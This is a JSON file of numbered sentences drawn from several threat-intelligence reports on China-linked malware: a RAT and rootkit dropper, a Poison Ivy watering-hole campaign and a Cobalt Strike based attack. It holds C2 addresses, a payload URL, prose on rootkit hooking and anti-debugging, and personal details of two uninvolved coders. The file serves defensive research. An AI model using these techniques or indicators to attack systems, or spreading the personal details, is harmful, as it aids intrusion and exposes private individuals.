{"0": "In late December 2011 , CrowdStrike , Inc. received three binary executable files that were suspected of having been involved in a sophisticted attack against a large Fortune 500 company .", "1": "The files were analyzed to understand first if they were in fact malicious , and the level of sophistication of the samples .", "2": "The samples were clearly malicious and varied in sophistication .", "3": "Some AV engines occasionally identify this sample as Derusbi Trojan .", "4": "CrowdStrike Intelligence Team has seen Trojans from 8 different builder variants of this RAT , including 64-bit versions , used in targeted attacks in 2011 against Defense , Energy/Power , and Chemical Industries in US and Japan .", "5": "All of these samples reflect common toolmarks and tradecraft consistent with Chinese based actors who target various strategic interests of the United States including High Tech/Heavy Industry , Non-Governmental Organizations ( NGOs ) , State/Federal Government , Defense Industrial Base ( DIB ) , and organizations with vast economic interests .", "6": "This report contains an in-depth technical analysis of the samples , detection/remediation/mitigation information , attribution intelligence , and a conclusion aimed at providing the reader with a synopsis of the report .", "7": "This code appears to have been compiled on Wednesday May 4th , 2011 at 11:04:24 A.M. UTC ( equivalent to early evening time in China ) .", "8": "Note that the timestamp is in UTC , however the relative time of day in China is provided for the benefit of the reader .", "9": "The CSIDL in this case pints to : '' The file system directory that contains documents that are common to all users .", "10": "A typical path is C : \\Documents and Settings\\All Users\\Documents .", "11": "This date is specified in the dropper code and does not change across multiple infections .", "12": "This is a relatively common technique used by malware dropper files to optimize the number of files required to infect a machine .", "13": "The resource language of the malicious DLL is set to '' Chinese ( Simplified ) '' , this is a compiler artifact which indicates the language setting on the compiler used by the person who built the binary was set to '' Chinese ( Simplified ) '' at the time the dropper was compiled .", "14": "The 'MZ ' header which denotes a binary executable file of the dropped DLL is initially obfuscated .", "15": "A subroutine to decompress the dropped file is present as 'dead code ' ( code that is not used ) in the binary .", "16": "This subroutine will be invoked on the already closed file handle of the dropped file in the present code version .", "17": "Since the dropped resource is not compressed , the routine fails .", "18": "This indicates a low sophistication modification to the original dropper code to make it work with an uncompressed source .", "19": "The dropper binary contains an icon resource that resembles the 'Google Chrome ' browser icon , the re- source language is set to '' Chinese ( Simplified ) '' , which is consistent with the builder of the tool systems language set to Chinese .", "20": "This code appears to have been compiled on Wednesday May 4th , 2011 at 10:48:19 A.M. UTC ( equivalent to early evening time in China ) .", "21": "This export first attempts to stop a service called '' msupdate '' , which is not a known Microsoft Windows service despite the appearance .", "22": "In the case of installation failure , rundll32.exe calls the main functions export 'CollectW3PerfData ' .", "23": "The main entry point to the DLL is named 'CollectW3PerfData ' , as it first creates and displays a fake Window with class '' NOD32 % d '' where % d is replaced with a pseudo-random number .", "24": "The window is however not visible and implements no specific functionality .", "25": "In order to accomplish this task , the newly created thread initializes networking APIs using WSAStartup ( ) and resolves some other APIs dynamically using LoadLibrary ( ) and GetProcAddress ( ) .", "26": "The C2 location in this sample is statically defined as 1.9.5.38:443 ( Malaysia : Tmnet , Telekom Malaysia Bhd ) .", "27": "While ther is 'dead code ' that will download the C2 location from an HTTP URL that could be defined in the binary , using the User-Agent string '' Google '' , this code is not activated due to the format of the stat- ically defined C2 location using an IP address .", "28": "This indicates the use of a 'boiler plate code ' or a builder software package that automates the creation of the malicious sample .", "29": "When a connection can successfully be established to the C2 server , the sleep timer is reset to two seconds for the next attempt .", "30": "The network protocol used by this sample resembles a 'Type-Length-Value ' layout in both directions .", "31": "Each 16 byte request header consists of : Zero or more of specified bytes of additional payload then follows the header .", "32": "Providing additional payload of any larger size will result in a trivial exploitable stack buffer overflow that allows arbitrary code execution due to the absence of any security features .", "33": "However , exploitation of this vulnerability is unnecessary due to the already available unauthenticated command execution capabilities of this backdoor .", "34": "Certain commands initiate a second connection to the C2 in a separate thread using the same network protocol but providing a different request command identifier than for the initial beacon .", "35": "Note that such an account does not normally exist in an Active Directory environment .", "36": "Additionally , the primary C2 connection allows for requests to start additional connections to the C2 imple- menting the following functionality : This sample is typical of a post exploitation tool ; it is written in .NET", "37": "2.0 .", "38": "This code appears to have been compiled on Thursday May 26th , 2011 at 10:21:44 A.M. UTC ( early evening time in China ) .", "39": "A detailed listing of command line arguments can be viewed in Appendix A .", "40": "The sample contains an embedded IP address for C2 that is stored in an encrypted format as a string re- source : The first two bytes of this string represent the base 16 length of the encrypted string , in this case , '' 0x14 '' .", "41": "Following this is a base64 encoded string of the specified length .", "42": "Once this string has been decoded using base64 , the result is then XOR 'd with the fixed value of 0xAA yielding the decoded IP address 202.86.190.3:80 ( Hong Kong : TeleOne ( HK ) Limited ) .", "43": "This value is then transformed using a simple algorithm in Appendix F into a 32 byte array .", "44": "Beacon , this is typical of this type of malicious sample , it allows the operator to separate various infected hosts in a targeted campaign .", "45": "The command format is derived from a structure consisting of : These fields are received as a sequence of serialized .NET", "46": "objects in the order specified .", "47": "A detailed description of the possible values for commands is in Appendix D. It is important to note that the order in which the application defines them is not the same order as they appear to be coming over the network .", "48": "This binary is compiled with the /GS flag using Visual Studio 2010 , enabling stack buffer overflow detection .", "49": "This code appears to have been compiled on Sunday October 30 , 2011 at 12:43:33 P.M. UTC ( late evening time in China ) .", "50": "The code contains several Run Time Type Information ( RTTI ) artifacts that indicate most of the C++ class names were prefixed with the string '' PCC '' in the original source code .", "51": "Variants of this Trojan are sometimes detected under the name 'Derusbi ' by Microsoft , Trend , Sophos and Symantec AV engines .", "52": "The steps it takes to install itself onto a system are as follows : 2 .", "53": "3 .", "54": "4 .", "55": "5 .", "56": "6 .", "57": "It then calls either the original or copy of regsvr32.exe with the parameters /s /u and the path to the copy of itself it made in Step 1 .", "58": "The /u parameter means '' uninstall '' , which calls DllUnregisterServer , this is an unsophisticated method of DLL entry point obfuscation .", "59": "7 .", "60": "DllUnregisterServer installs the driver and initiates the backdoor component .", "61": "If the process '' ZhuDongFangYu .", "62": "exe '' is running ( AntiVirus360 program from the Chinese 'Quihoo 360 Technology Co. , LTD ' 360 ) , or the username of the DLL 's host process context is not 'SYSTEM ' , the driver is not written to disk .", "63": "The malware contains a dynamic configuration stored in the Registry under and loads a default configuration embedded into the binary if such a configuration is not found .", "64": "The way this default configuration is loaded and parsed indicates that this malware has been built with a 'builder ' that takes a template sample and lets an unsophisticated user specify a configuration without recompiling any code .", "65": "This effectively hijacks the original service 's entry while retaining its functionality .", "66": "tool .", "67": ") , totaling 7 distinct supported C2 mechanisms .", "68": "In self-configuration , a connection via a proxy is attempted if the system wide Internet Explorer settings specify such a proxy .", "69": "The configuration found in this sample is set to automatic self-configuration , resulting in the following mechanisms being tried in this order : 1 .", "70": "The C2 then responds with 64 bytes where the first four bytes must match the first four sent bytes to establish a connection successfully .", "71": "The remaining bytes are discarded .", "72": "Interestingly , the malware stores the first four bytes rotated right by seven bits and compares that value to the seven bits rotated right version of the server 's response , effectively neutralizing the rotation 's effect ; the purpose of this is unclear .", "73": "2 .", "74": "A long-running HTTP POST request to the path '' /forum/login.cgi '' with a statically defined HTTP request string including HTTP headers ( optionally over a HTTP Proxy using CONNECT ) .", "75": "The malware requires the response to start with '' HTTP/1.0 200 '' or '' HTTP/1.1 200 '' and an absence of a '' Connection : close '' header .", "76": "3 .", "77": "Two long-running HTTP requests to the same C2 ( optionally over an HTTP Proxy with original request verb ) , one GET request to '' /Photos/Query.cgi ? loginid= '' followed by a random number and one POST request to '' /Catelog/login1.cgi '' .", "78": "This demonstrates an attempt to use the most efficient communication channel first , falling back to more legitimate appearing channels as required in order to appear Request For Comment ( RFC ) compliant with the HTTP protocol .", "79": "Since this C2 mechanism is not attempted in self-configuration and was not configured for this binary , analysis was left out due to time constraints .", "80": "The C2 's binary data blobs are compressed .", "81": "No further encryption of the data takes place .", "82": "All C2 transport implementations contain code for accepting and handling server-side connections of the respective protocols .", "83": "However , this code does not appear to be invoked .", "84": "It appears that the author of this code shares the library that implements these transports for the client with the C2 server .", "85": "The handler class is responsible for parsing the remainder of the command .", "86": "It supports up to 1024 parallel connections .", "87": "The supported built-in commands are : The only command that is implemented directly in the main backdoor thread as a subprocedure call and not via a generic command handler class is command ID 256 .", "88": "This sample is a packed 32-bit kernel driver extracted by the aforementioned DLL with an MD5 hash of : de7500fc1065a081180841f32f06a537 , this sample will only function on a Windows 32-bit kernel .", "89": "This code appears to have been compiled on Sunday October 9 , 2011 at 4:50:31 P.M. UTC ( very early morning time of Monday , October 10 in China ) .", "90": "This section describes how the driver performs its initialization routine .", "91": "The Windows API for creating events ( ZwCreateEvent ( ) , or CreateEvent ( ) in user mode ) already provides the ability to '' create-or-open '' an event , so the use of an initial ZwOpenEvent is superfluous and indicative of relatively limited Windows API knowledge of the author of that part of the code .", "92": "It is interesting to note that some of the hex digits in the object name are mixed case which is potentially indicative of the code being re-appropriated from another source .", "93": "Tools such as Syser Debugger , or debugging through a virtual machine are unaffected by this technique .", "94": "The sample , rather than importing the KdDisableDebugger ( ) API using conventional methods , looks up the API through MmGetSystemRoutineAddress ( ) instead .", "95": "All of the other APIs used by the driver are imported normally , so this is not a technique to hide import APIs used throughout the driver .", "96": "Searching Google for '' MmGetSystemRoutineAddress '' and '' KdDisableDebugger '' results in dozens of Chinese language blogs which explain how to use this technique to '' Disable WinDbg '' .", "97": "Checking the version is necessary because Windows versions beginning with Vista utilize a redesigned TCP/IP net- work stack , most hooking operations will require a different implementation for these versions .", "98": "On versions prior to Windows Vista , the TCP/IP driver creates a \\Device\\Tcp device object through which most network requests are piped through .", "99": "On Vista and later , TCP/IP has been split up into multiple components , and IP connection enumeration , which this driver is targeting , is managed by \\Device\\nsiproxy instead .", "100": "The NSI hook , targets IOCTL 0x12001B , which is used by NsiGetObjectAllParameters ( ) in nsi.dll when users typically run commands such as netstat.exe or use any of the IP Helper APIs in iphlpapi.dll .", "101": "This functionality is nearly identical to the code posted by Edward Sun ( aka cardmagic , sunmy1 @ sina.com , onlyonejazz @ hotmail.com , cardcian @ mail.ustc.edu.cn , QQ # 28025945 ) from Hefei , Anhui province ( Nanjing Military District ) on July 8 , 2007 , then a China-based researcher at Trend Micro ( now working at Kingsoft Chinese AV Company ; LinkedIn profile page : http : //www.linkedin.com/profile/view ? id=84082731 ) at http : //forum.eviloctal.com/viewthread.php ? action=printable & tid=29604 ( See Appendix G ) .", "102": "CrowdStrike has no information connecting Mr. Sun to this intrusion activity , his code appears to have been appropriated by the actor to add similar functionality to their code .", "103": "This IOCTL has the exact same functionality as the NSI specific IOCTL .", "104": "This IOCTL was the mechanism used on Windows versions prior to Windows Vista .", "105": "The system call hooking targets three functions : ZwSaveKey ( ) , ZwQueryValueKey ( ) , and ZwEnumerateValueKey ( ) .", "106": "Because the system call stub uses the EAX register as an index for the system call ID , and a '' mov eax , imm32 '' instruction '' instruction is used , this second DWORD will match the system call ID .", "107": "It then adds this index to the value of KeServiceDescriptorTable.Base , which is the exported kernel variable ( on 32-bit Windows only ) which directly points to the system call table .", "108": "This is one of the simplest ways to do a system call hook , but will not work on 64-bit Windows as this variable is not exported in addition to the protection provided by Microsoft PatchGuard .", "109": "Once the MDL is associated to the non-paged buffer , the sample locks the underlying pages using the Windows API MmProbeAndLockPages ( ) .", "110": "It uses the standard '' mov cr0 , eax '' technique , turning off the Write Protect ( WP ) bit as it does this .", "111": "When the hook is installed , it writes a special DWORD value , 'KDTR ' , which allows it to prevent double-hooking or badly-hooking the system call , during unhooking , this value is also checked .", "112": "In the ZwSaveKey ( ) hook , access to \\\\REGISTRY\\\\MACHINE\\\\SYSTEM is blocked .", "113": "RegSaveKey ( ) which is the user-mode implementation of the kernel ZwSaveKey ( ) API , is typically used when performing an offline backup of a particular registry key .", "114": "hook is the ZwQueryValueValue ( ) hook , which looks for '' Parameters '' key of a service within the registry at \\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\ .", "115": "The user-mode service stores configuration data in the '' Security '' subkey of the RPC registry key , this component will obfuscate the user-mode configuration data .", "116": "The driver does not make any efforts to hide its own key , nor does it specifically check for '' RPC '' before '' Security '' , which can lead to random data being obfuscated .", "117": "The final hook , ZwEnumerateValueKey ( ) , is similar in structure to the ZwQueryValueHook key , due to the fact that these APIs provide almost identical functionality when it comes to reading registry values .", "118": "This allows the driver to receive the 'CMKEYOBJECT ' which is then used with ObQueryNameString ( ) to get the key/value path .", "119": "However , no call to ObDereferenceObject ( ) is ever made , which means that all registry objects being sent to these APIs are eventually leaked .", "120": "In the registry hook , it was noticed that '' CurrentControlSet001 '' was used as the target , if the target machine was using a '' last known good '' configuration , or a roaming hardware profile , the registry hook would not function as intended .", "121": "This is the reason the Microsoft implemented a symbolic link to \\\\CurrentControlSet which ensures that regardless of the machines configuration any request will access the correct registry key .", "122": "This threat actor leaves several key fingerprints which can be used to identify compromised systems .", "123": "These digital fingerprints are unique to this adversary for this campaign .", "124": "The following network signatures are designed for the popular Open Source IDS called Snort .", "125": "These signature can be ported to other formats upon request .", "126": "The following file system artifacts are indicative of a compromised host : The following Windows Registry artifacts are indicative of a compromised host : The backdoor may be detected by several different Anti-Virus products under a signature with the name : Attribution in the cyber domain is always a tricky subject when relying solely on malicious samples .", "127": "Compiler artifacts and language settings can of course be deliberately masked or spoofed .", "128": "CrowdStrike uses a unique approach of comprehensive threat analysis in order to decipher attributable components .", "129": "Based on the corroborating evidence discovered in the course of this analysis , it appears there are numerous indications that this is a Chinese-speaking actor .", "130": "ZhuDongFangYu.exe is a component of 360 360\udbc0\udd94\udbc0\udd94\udbc0\udd94\udbc0\udd94 , a Chinese security product available from http : //www.360.cn/ .", "131": "Speculatively this may be because this security product detects this rootkit , or the author was attempting to prevent accidental infection on systems running this Anti-Virus product .", "132": "The obfuscation of the KdDisableDebugger ( ) function call is seen on several Chinese language forums , and can be seen being reused in several code samples on those forums .", "133": "As previously mentioned there is no advantage associated with using this call obfuscation , and appears to be reused for no apparent reason other than the attackers have copied code directly from forum code .", "134": "This post is currently mirrored on dozens of Chinese hacking websites .", "135": "Similarly the system call hooking is less impressive after searching for '' IoAllocateMdl '' and '' cr0 '' ( bbs.pediy .", "136": "The ldasm inline hooking is also repeated in numerous postings to Chinese forums .", "137": "One particular website ( http : //read.pudn.com/downloads197/sourcecode/windows/sys- tem/927802/CCRootkit/RootkitSys/HookSSDT.c.htm ) had an almost identical ldasm loop that tried to identify the exact same code sequences .", "138": "While the driver does not use pool tags for most of its allocations , it does utilize them in the networking hooking code , much like the examples found on the Chinese language forums .", "139": "This sample uses pool tags : 'tnet , ' and 'KDTR ' .", "140": "Although the meaning of the KDTR tag is not obvious , we assess with high confidence that this is a shortened version of : '' Kernel DeTouR '' , which coincides with the matching functionality of the detour-style inline hook .", "141": "The driver code ( MD5 : dae6b9b3b8e39b08b10a51a6457444d8 ) appears to be a combination of various code that is easily searchable on the Internet , and almost always attributed to Chinese language forums and websites .", "142": "The system call hooking parts of the code appear to be identical to the HookSSDT.c code authored by Steven Lai 'embedlinux ' and utilized in what the author titled 'CC Rootkit ' on on August 4 , 2008 who 's email address is hqulyc @ 126.com .", "143": "This user has a QQ identity of : 5054-3533 , QQ is a popular instant messaging chat client used almost exclusively in China .", "144": "His real name according to his QQ profile ( http : //user.qzone.qq.com/50543533 ) appears to be Steven Lai .", "145": "He was is 28 years old ( born September 5 , 1983 ) and lives in Xiamen , Fujian province ( Nanjing Military Region ) .", "146": "According to his profile , he has worked at Xiamen XOCECO New Technic Co. , Ltd. ( http : //www.likego.com/en/about.asp ) , a company that builds audio/video systems for transportation systems .", "147": "Mr. Lai is not being identified as the actor , his code however was used by whomever built the kernel driver utilized by the backdoor and for this reason we are providing the background on this individual .", "148": "The samples involved in this incident are typical of attacks commonly associated with the People's Republic of China ( PRC ) .", "149": "These code samples have a variety of Tools , Techniques , and Procedures ( TTPs ) that are used to track and identify specific adversary groups .", "150": "The sophistication of the actor responsible this incident is difficult to quantify without visibility into the activities that transpired on the victims network .", "151": "The ability to conduct Incident Response ( IR ) including forensics , and log analysis , greatly augments this visibility into these aspects of the incident .", "152": "Some indications as to the adversaries ' capabilities can be derived from the captured samples alone .", "153": "The dropper code ( MD5 : 14c04f88dc97aef3e9b516ef208a2bf5 ) does not utilize any techniques that are unique or unusual , and is consistent with tools , techniques , and procedures of attacks targeting proprietary information and generally attributed to the PRC .", "154": "The presence of dead code and its replacement by a more simple obfuscation method to hide the to-be-dropped dll binary file indicates code reuse on the attacker side .", "155": "The 'dead code ' utilizes a more sophisticated compression algorithm provided by a third party which was rendered useless for some reason .", "156": "This may have been a result of the attacker modifying an existing tool , or unknowingly using a re-purposed tool .", "157": "The dropper resources indicate the compiler used to build the tool was running on a system that utilized the Chinese '' Simple '' language pack and was built on Wednesday May 4th , 2011 at 11:04:24 A.M. UTC ( early evening time in China ) .", "158": "While this can be deliberately spoofed as a 'false flag ' other indicators including the C2 are consistent with this having been the work of a Chinese speaking actor .", "159": "The code quality is not impressive , and contains a trivial stack buffer overflow vulnerability .", "160": "Despite the buf- fer overflow , the C2 channel lacks any command authenication or encryption , apart from the initial beacon encryption/obfuscation using a statically compiled XOR key .", "161": "The sample uses TCP port 443 for commu- nication , but makes no attempt to mimic the SSL protocol typically used on that port number , which would provide enhanced Operational Security ( OPSEC ) .", "162": "This code appears to have been compiled on Wednes- day May 4th , 2011 at 10:48:19 A.M. UTC ( early evening time in China ) .", "163": "This tool is built in Microsoft .NET", "164": "framework , which is typically an indication of a less sophis- ticated attacker , because .NET", "165": "is easier to develop in but requires the .NET", "166": "framework be present on the victim machine .", "167": "The tool appears to have been compiled on Thursday May 26th , 2011 at 10:21:44 A.M. UTC ( early evening time in China ) .", "168": "The code base for the sample was developed in C++ .", "169": "The code appears to have been compiled on Sunday October 30 , 2011 at 12:43:33 P.M. UTC ( late evening time in China ) .", "170": "The DLL itself contains traces of the original C++ class names that were utilized in the source code , which in general were prefixed with 'PCC ' .", "171": "The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the source code Steven Lai posted .", "172": "The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the source code Steven Lai posted .", "173": "Implemented values for cmdID are as follows : cmdType can be one of the following ( Interesting commands explained in detail ) : string0 can have one of the following values dependant upon command id and type .", "174": "cardmagic writes : Windows Vista has changed alot on network module , many old port hiding materials are no longer usable .", "175": "In this post , I will share with you a simple code to hide port under Vista , hope it is useful for some guys .", "176": "Actually under Windows Vista , netstat.exe will call InternalGetTcpTable2 which is exported by Iphlpapi.dll to list all open ports , then InternalGetTcpTable2 will transfer control to NsiAllocateAndGetTable which is exported by nsi.dll , and finally nsi.dll involve NsiEnumerateObjectsAllParametersEx to interact with kernel mode module of NSI -- nsiproxy.sys .", "177": "nsiproxy.sys is almost like a wrapper of netio.sys , it will then call internal subroutines of netio.sys .", "178": "Here , we will use a relatively easy way -- '' NSI Kernel Module Dispatch Routine Hook '' to demonstrate the specified port hiding uner Vista .", "179": "Dispatch routine hook is an old topic , this time , we will apply this method to nsiproxy.sys .", "180": "Please focus on how to handle the content filtering of NSI : ) Check the following code ( Notice : I only tested it under Windows Vista RTM 32bit ) :", "181": "On September 24 2014 , FireEye observed a new strategic web compromise ( SWC ) campaign that we believe is targeting non-profit organizations and non-governmental organizations ( NGO ) by hosting iframes on legitimate websites .", "182": "FireEye has not yet attributed this activity though we have identified links to the Sunshop Digital Quartermaster , a collective of malware authors that supports multiple China-based advanced persistent threat ( APT ) groups .", "183": "FireEye previously established detection measures for this threat activity , ensuring our clients were prepared for these intrusion attempts well in advance of threat actor implementation .", "184": "On September 24 , FireEye observed SWCs , likely conducted by a unitary threat group based on shared infrastructure and tools , on at least three different websites : an international non-profit organization that focuses on environmental advocacy , and two different NGOs that promote democracy and human rights .", "185": "Figure 1 displays one of the iframes .", "186": "A GET request to this URI returned the following content : The 'bin ' param shown in Figure 2 is decoded from ASCII into hex by the Java exploit .", "187": "Once decoded , FireEye identified the payload as a Poison Ivy variant .", "188": "However , the malware author misspelled multiple words when attempting to put in versioning information for this particular build .", "189": "The Poison Ivy backdoor also had a RTMANIFEST PE resource with a SHA256 fingerprint of 82a98c88d3dd57a6ebc0fe7167a86875ed52ebddc6374ad640407efec01b1393 .", "190": "This same RTMANIFEST resource was documented in our previous Sunshop Digital Quartermaster report .", "191": "FireEye previously identified this specific RTMANIFEST as the 'Sunshop Manifest , ' and we have observed this same manifest resource used in 86 other samples .", "192": "As we stated in the Quartermaster report , we believe this shared resource is an artifact of a builder toolkit made available to a number of China- based APT groups .", "193": "This activity represents a new SWC campaign .", "194": "We suspect threat actors are leveraging their access to compromised websites belonging to NGOs and non-profits to target other organizations in the same industries .", "195": "These websites are often visited by organization employees and other organizations in the same industries , allowing threat actors to move laterally within already compromised networks or gain access to new networks .", "196": "While FireEye has not attributed this activity to a specific threat group , we frequently observe China-based threat actors target non-profits and NGOs , and we suspect that they seek to monitor activity within their borders that may lead to domestic unrest or embarrass the Chinese government .", "197": "For example , in 2013 , FireEye observed China-based threat actors steal grant applications and activity reports specifically related to an international NGO 's China-based activities .", "198": "We suspects threat actors sought to monitor these programs and involved individuals .", "199": "The three organizations whose websites are hosting the malicious iframes have China-based operations .", "200": "FireEye is releasing information on this campaign to allow organizations to investigate and prepare for this activity in their networks .", "201": "We believe non-profits and NGOs remain at elevated risk of intrusion and should be especially wary of attempts to compromise their networks using SWC .", "202": "Threat actors may use SWCs to achieve this goal , but FireEye does not discount the possibility that threat actors will use other means at their disposal , including phishing .", "203": "Based on past threat actor activity in this industry , FireEye expects threat actors are motivated to steal programmatic data and monitor organizations ' programs in specific countries .", "204": "If China-based threat actors are behind the observed campaign , FireEye expects that organizations with operations in China are high-priority targets .", "205": "FireEye currently has detection measures in place that should allow users of FireEye products to detect this SWC activity .", "206": "It is also likely that other industries or organizations were affected by this SWC activity , since these sites are public facing and frequently visited .", "207": "Special thanks to Google 's Billy Leonard for providing additional information and research .", "208": "Thanks to the following authors for their contributions : Mike Oppenheim , Ned Moran , and Steve Stone .", "209": "This entry was posted in Threat Intelligence , Threat Research by Sarah Engle and Ben Withnell .", "210": "Bookmark the permalink .", "211": "A few days ago we detected a watering hole campaign in a website owned by one big industrial company .", "212": "The website is related to software used for simulation and system engineering in a wide range of industries , including automotive , aerospace , and manufacturing .", "213": "As we have seen , this is a very powerful framework that gives attackers a lot of insight into the potential targets that will help them launching future attacks against them .", "214": "We have also seen several Metasploit-produced exploits that target different versions of Java in the same IP address that hosts the Scanbox framework ( 122.10.9 [ .", "215": "] 109 ) .", "216": "We recommend you look for this type of activity against the following machines in your network :", "217": "Recently , ANTIY Labs detected an APT attack targeting some government agency in China .", "218": "The Shellcode for communication is conducted depending on Beacon mode which is generated on the basis of automatic attack detection platform - Cobalt Strike .", "219": "Considering the relationship between this attack and Cobalt Strike platform , we name it as APT - TOCS ( TOCS refers to Threat on Cobalt Strike . ) for now .", "220": "After loading the script of Shellcode , the Analysis Group of ANTIY did a series of correlation analysis , then we found a PE program that maybe act as a guiding executable file in similar attacks .", "221": "The loaded Shellcode script can be used to call command line to add a certain field of encrypted date into memory and run it .", "222": "The decrypted date turns out to be executable Shellcode which is generated by Cobalt Strike .", "223": "The related script can be loaded via the guiding PE program or vulnerability .", "224": "This kind of attack pattern has several features which including running in memory , no hard disk writing operations , communicating via Beacon , multi - beacon communication is acceptable , and several Beacons can work simultaneously .", "225": "Such attack can be launched without the support of vector file , in fact it depends on network projection and laterally move in the internal network as required conducting an attack .", "226": "So , it will bring great difficulties to the forensic work .", "227": "It is important to note that , all the Sandboxes we know are disabling to fight against this kind of attack .", "228": "It seems that the attack capability of APT - TOCS is close to that of APT - level .", "229": "However , it relied on automatic attack testing platform instead of abilities of the attack team .", "230": "The analysts of Antiy thought that the attacker might know several remote injection methods of script downloading privilege , such as directly making the scrip be executed on the host by using security vulnerabilities .", "231": "Meanwhile , we found the following binary leading attack files ( hereinafter referred to as Sample A ) were used in similar attacks before .", "232": "2.2 Key mechanism The core part of APT - TOCS relies on the encrypted data scripts ( hereinafter referred to as Sample B ) downloaded by PowerShell .", "233": "Figure 1 consists of various derivation relationships and major module functionalities .", "234": "2.3 Analysis on the major sample ( Sample B ) of APT - TOCS The content ( Here omitted the content of base64 . ) of Sample B is as follows .", "235": "The functionality of this part of script is : decrypting the encrypted content of base64 , decompressing with Gzip , resulting in module 1 and using PowerShell to download and execute .", "236": "2.4 Analysis on script 1 The content of script 1 is as follows .", "237": "2.5 Analysis on module 1 The functionality of this module is as follows : calling the function of wininet module , connecting the network , downloading operations of module 2 ; and executing by downloading to the memory .", "238": "Figure 6 shows that using request of HTTP GET to get file : http://146.0.43.107/hfYn .", "239": "2.6 Analysis on module 2 Module 2 established and listed system process rundll32.exe .", "240": "Data that has been written into module 3 .", "241": "Though the data of module 3 started with \" MZ \" , it does not belong to PE files .", "242": "Instead , it is the Shellcode with backdoor functionality .", "243": "2.7 Analysis on module 3 The module might connect the following 2 addresses with port 80 .", "244": "\uf06c 146.0.***. * * * ( Romania ) \uf06c dc.******69.info ( 146.0.***. * * * ) ( Romania ) Sending request data and receiving return data .", "245": "The decryption to above IP , domains and accessing addresses is \" XOR 0x69 \" .", "246": "The heartbeat package data includes : check code , process ID , system version , IP address , computer name , account , whether it is 64 bit process .", "247": "Then it transmits by making use of both RSA and BASE64 encryption .", "248": "Analysis on APT - to - be Attack That Focusing on China 's Government Agency As the process ID and check code are different , the transmitted heartbeat package data are different each time .", "249": "The check code is calculated through using process ID and the millisecond process during system startup .", "250": "The algorithm is as follows .", "251": "The encrypted heartbeat package used Cookie field to transmit .", "252": "3 The authentication analysis on the technology sources of this attack The leading PE files , Sample_A and Sample B , associated by analysts of Antiy CERT used the exactly same method of PowerShell .", "253": "However , we can not eliminate the possibility that Sample_A has no positive connection with this attack due to the high standardization of relevant scripts .", "254": "We still consider it as a series of attack incidents based on other comprehensive analysis .", "255": "The attacker might exploit the following ways to control the target host , such as social engineering e - mails , file bundling , exploiting system and application vulneratbilities , lateral movement of intranet and so on .", "256": "We found \" Beacon \" strings when analyzing \" Module 1 \" .", "257": "According to existed experience , we doubted that Shellcode is closely related with automatic attack testing platform Cobalt Strike .", "258": "Therefore , our analysts carried out comparison analysis on Beacon generated by Cobalt Strike , and authenticated the relationships between them .", "259": "Cobalt Strike is the GUI framework penetration tool based on metasploit .", "260": "The business version of it integrates the following characteristics : service scan , automatic overflow , multi - mode port espionage , various Trojan generation , phishing attack , site clone , target information obtaining , automatic browser attack and so on .", "261": "3.1 Comparison of Module 1 We compared module 1 and the payload generated by using Beacon , and found only the following different data : the Head data , request file name and IP address .", "262": "The left is sample module 1 , while the right is the module generated by Beacon .", "263": "We can lead to the conclusion from the comparison : module 1 is generated by Beacon .", "264": "The screenshot of data package in request is as follows .", "265": "3.2 Comparison of disassembling commands of module 2 Our analysts compared sample module 2 and relevant files of Beacon , and found that the disassembling commands between them are exactly the same with exception of functionality code , including XOR encryption at the entry , downloading system DLL , obtaining function address , function calling modes and so on .", "266": "The following lists three points .", "267": "3.3 Comparison analysis on module 3 data package The following figure is the GET request comparison of the module generated by sample module 3 and Beacon .", "268": "Cobalt Strike has the following characteristics .", "269": "According to the traces in the past , we believe that the threat has been active for 5 years ; unfortunately , there is n't any powerful detection production and methods to defeat the malicious attack till now .", "270": "Compared with APT incidents in the past , the APT attack in this case does n't cost too much , and the attackers are n't responsible for coding .", "271": "With the application of commercial attack platform , the attackers saved the cost of an attack , also the vulnerability built joint function provided by relevant attack platform make the attackers easy to do injection .", "272": "As a result , nations and organizations which without its own elite hacker groups and abundant capital can also launch some kind of APT attack via the attack pattern mentioned in this case .", "273": "Meanwhile , it 's more difficult for us to tracing when facing such modeled attack .", "274": "One of the leaders in Information Security area - Bruce Schiner said , \" when big events on information security happened , people tend to treat it as an example of cyber warfare .", "275": "It 's ridiculous .", "276": "From my point of view , what 's happening and going to happen is : more and more tactics in physical warfare are applied to cyber warfare .", "277": "It 's important to note that , attack capabilities can be widely distributed if attackers take full advantages of certain technology , especially computer technology can make attack more powerful and automated . \" Obviously , highly automated commercial platform realized a high speed of spread of this attack capability ( exceeded our anticipation ) .", "278": "We have to remind all relevant parties that we are confronting with the risk of large scale diffusion of network armaments which is led by the low cost of the attack capability .", "279": "The commercial penetration attack detecting platform has two sides , on one hand , it can check the network environment of systems effectively , on the other hand , for nations , organizations and industries which has limited budget , it costs too much .", "280": "Given the situation , all related parties should conduct more communication with each other , additionally , there is no doubt that both offensive party and defensive party are supported by superpowers , these superpowers should prevent the attack technique from widely distributing .", "281": "The incident mentioned there has no difference with other cases we detected in the past , it shows that , on the way to realize national informatizaion , we must fight against serious security challenges as we confronting now ; it 's also a good opportunity for our Chinese people and enterprises to demonstrate our faith and the efforts we made to conquer the challenge .", "282": "Cobalt Strike is the business version of Armitage which is the penetration testing software of Metasploit figure interface written by Java .", "283": "Armitage can carry out automatic attacks by combining with known exploits of Metasploit .", "284": "It integrates the free version of Armitage under bt5 and kali linx , and the most powerful functionality is adding the Payload of Beacon .", "285": "The first release time of Cobalt Strike is June , 2012 .", "286": "Author of Cobalt Strike : Raphael Mudge Raphael Mudge is the founder of Strategic Cyber LLC , a Washington , DC based company that creates software for red teams .", "287": "He created Armitage for Metasploit , the Sleep programming language , and the IRC client jIRCii .", "288": "Previously , Raphael worked as a security researcher for the US Air Force , a penetration tester , and he even invented a grammar checker that was sold to Automattic .", "289": "His work has appeared in Hakin9 , USENIX ; login : , Dr.", "290": "Dobb 's Journal , on the cover of the Linux Journal , and the Fox sitcom Breaking In .", "291": "Raphael regularly speaks on security topics and provides red team support to many cyber defense competitions .", "292": "Education background : Syracuse University , Michigan Technological University Current position : Strategic Cyber LLC , Delaware Air National Guard Skills : software development , information security , object - oriented design , distributed system , figure interface , computer network design , blog system , social engineering , security research and so on .", "293": "Supported organizations .", "294": "Collegiate Cyber Defense Competition ( CCDC ) North East CCDC 2008 - 2015 Mid Atlantic CCDC 2011 - 2015 Pacific Rim CCDC 2012 , 2014 South East CCDC - 2014 Western 